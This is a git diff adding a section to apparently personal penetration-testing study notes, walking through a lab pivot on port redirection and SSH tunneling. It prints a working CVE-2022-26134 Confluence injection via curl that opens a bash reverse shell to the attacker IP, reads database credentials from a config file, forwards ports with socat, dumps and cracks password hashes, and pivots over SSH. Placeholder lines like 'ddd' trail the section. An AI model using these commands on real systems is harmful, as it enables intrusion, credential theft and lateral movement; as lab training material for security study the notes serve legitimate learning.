@@ -1468,7 +1468,44 @@ Reference
     - obtain a root shell via kernel exploitation  
       `./cve-2017-16995` `id`  
 
-### 19. Port redirection and SSH tunneling
+### 19. Port redirection and SSH tunneling  
+- **Port redirection** modifies the data flow by redirecting packets from one socket to another. Configure a host to listen on one port and relay all packets received on that port to another destination
+- **Tunneling** means encapsulating one type of data stream within another, for example, transporting Hypertext Transfer Protocol (HTTP) traffic within a Secure Shell (SSH) connection
+- A **DMZ** is a network containing devices that may be more exposed to a wider, less trusted network
+- Kali (WAN) > Confluence + PostgreSQL (DMZ)  
+- Port forward to access PostgreSQL PGDATABASE01 from kali
+  - confluence 192.168.124.63; PGDATABASE01 10.4.124.215; kali 192.168.45.156
+  - `nc -nvlp 4444`
+  - get reserve shell from confluence [CVE-2022-26134](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/). change confluence server and kali ip.
+    `curl http://192.168.124.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.156/4444%200%3E%261%27%29.start%28%29%22%29%7D/'
+  - enumerating network interface on CONFLUENCE01 > 192.168.124.63/24, 10.4.124.63/24
+    `ip addr`
+  - enumerating routes on CONFLUENCE01 > 192.168.124.0/24 dev ens192 , 10.4.124.0/24 dev ens224
+    `ip route`
+  - credentials found in the Confluence confluence.cfg.xml
+    `cat /var/atlassian/application-data/confluence/confluence.cfg.xml`
+    output: <property name="hibernate.connection.password">D@t4basePassw0rd!</property>, <property name="hibernate.connection.url">jdbc:postgresql://10.4.124.215:5432/confluence</property>, <property name="hibernate.connection.username">postgres</property>
+  - open TCP 2345 on CONFLUENCE01 then forward to TCP 5432 on PGDATABASE01. Use Socat to do port forward
+    `confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.124.215:5432`
+  - use psql to connect to PostgreSQL database through our port forward
+    `psql -h 192.168.124.63 -p 2345 -U postgres`
+  - list out database info >  confluence
+    `postgres=# \l`
+  - connect to 'postgres' db
+    `\c confluence`
+  - View user info ~ [OneCompiler](https://onecompiler.com/mysql) > admin, database_admin, hr_admin, rdp_admin + SHA1/256 credentials
+    `select * from cwd_user;`
+    output: {PKCS5S2}3vfgC35A7Gnrxlzbvp32yM8zXvdE8U8bxS9bkP+3aS3rnSJxz4bJ6wqtE8d95ejA
+  - identify hashcat mode number from [hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes): 12001
+    `hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt`
+  - create a new port forward 2222
+    `confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.124.215:22`
+  - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01
+    `ssh database_admin@192.168.124.63 -p2222`
+- 
+- ddd
+- dddd
+- ddd
 ### 20. Tunneling through deep packet inspectation
 ### 21. The metassploit framework
 ### 22. Active directory introduction and enumeration
